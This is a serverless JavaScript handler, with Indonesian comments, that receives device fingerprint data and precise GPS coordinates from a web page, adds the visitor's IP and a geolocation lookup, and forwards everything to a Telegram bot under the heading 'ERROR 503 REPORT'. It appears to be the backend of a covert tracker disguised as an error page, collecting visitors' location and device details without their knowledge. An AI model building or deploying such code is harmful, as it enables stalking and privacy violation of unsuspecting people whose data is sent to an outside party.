export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  // ===== KONFIGURASI (ENV VERCEL) =====
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID  = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).send("ENV belum diset");
  }

  // ===== TERIMA DATA DARI JS =====
  const input = req.body || {};

  // ===== AMBIL IP CLIENT =====
  const ip =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress ||
    "Unknown";

  const time = new Date().toLocaleString("id-ID");

  // ===== IP INFO (seperti ipapi di PHP) =====
  let ipinfo = {};
  try {
    const ipRes = await fetch(`https://ipapi.co/${ip}/json/`);
    ipinfo = await ipRes.json();
  } catch (e) {
    ipinfo = {};
  }

  // ===== FORMAT PESAN (SAMA KAYAK PHP) =====
  const message = `
🚨 *ERROR 503 REPORT*

━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${input.os || "-"}
💻 Platform     : ${input.platform || "-"}
⚙️ CPU Cores    : ${input.cpu || "-"}
💾 RAM          : ${input.ram || "-"}
🖥 Resolution   : ${input.resolution || "-"}
🌐 Browser      :
${input.browser || "-"}

🕒 Timezone     : ${input.timezone || "-"}
🗣 Language     : ${input.language || "-"}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 *IP INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧭 Continent    : ${ipinfo.continent_code || "-"}
🇮🇩 Country      : ${ipinfo.country_name || "-"}
📍 Region       : ${ipinfo.region || "-"}
🏙 City         : ${ipinfo.city || "-"}
🏢 ISP / Org    : ${ipinfo.org || "-"}

━━━━━━━━━━━━━━━━━━━━
📡 *LOCATION INFORMATION*
━━━━━━━━━━━━━━━━━━━━
📐 Latitude     : ${input.latitude || "-"}
📏 Longitude    : ${input.longitude || "-"}
🎯 Accuracy     : ${input.accuracy || "-"}

🗺 Google Maps:
https://www.google.com/maps?q=${input.latitude},${input.longitude}

⏰ Time : ${time}
`;

  // ===== KIRIM KE TELEGRAM =====
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });

    return res.status(200).send("Pesan terkirim");
  } catch (err) {
    return res.status(500).send("Gagal kirim pesan");
  }
}
